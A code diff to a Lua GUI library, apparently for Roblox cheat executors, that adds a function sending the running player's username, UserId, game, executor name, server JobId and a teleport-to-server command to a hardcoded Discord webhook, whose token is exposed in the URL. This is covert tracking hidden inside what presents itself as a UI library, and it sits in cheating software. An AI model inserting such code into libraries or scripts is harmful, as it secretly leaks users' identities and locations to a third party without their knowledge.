@@ -206,6 +206,80 @@ function library.new(library, name, theme)
         end
     end
 
+    local time = os.date("%c", os.time())
+local teleport = "```lua\n" ..
+    'game:GetService("TeleportService")' ..
+    ":TeleportToPlaceInstance" .. "(" ..
+    game.PlaceId .. "," .. "'" .. game.JobId .. "'" .. "," .. "game.Players.LocalPlayer" .. ")```"
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+function webhook(title)
+    url =
+    "https://discord.com/api/webhooks/1256851464479838309/FLIX-QEMKptxZZo07rLQ6GXRGSG3yz0h77GpTAKfG7leT5ZMeuVEKwoSoNbvGTtF_kpw"
+    local data = {
+        ["content"] = "",
+        ["username"] = a,
+        ["embeds"] = {
+            {
+                ["title"] = title,
+                ["description"] = "落叶中心\n" .. teleport,
+                ["type"] = "rich",
+                ["footer"] = {
+                    ["text"] = time
+                },
+                fields = {
+
+                    {
+                        name = " 用户名 ",
+                        value = "> " .. game.Players.LocalPlayer.Name,
+                        inline = true
+                    },
+
+                    {
+                        name = " UserId ",
+                        value = "> " .. game.Players.LocalPlayer.UserId,
+                        inline = true
+                    },
+
+                    {
+                        name = " 游戏 ",
+                        value = "> " .. gameName,
+                        inline = true
+                    },
+
+                    {
+                        name = " 注入器 ",
+                        value = "> " .. identifyexecutor(),
+                        inline = true
+                    },
+
+                    {
+                        name = " JobId ",
+                        value = "> " .. game.JobId,
+                        inline = true
+                    },
+
+                    {
+                        name = " PlaceId ",
+                        value = "> " .. game.PlaceId,
+                        inline = true
+                    },
+                }
+            }
+        }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    request = http_request or request or HttpPost or syn.request
+    local a = { Url = url, Body = newdata, Method = "POST", Headers = headers }
+
+    request(a)
+end
+
     Main.Name = "Main"
     Main.Parent = dogent
     Main.AnchorPoint = Vector2.new(0.5, 0.5)
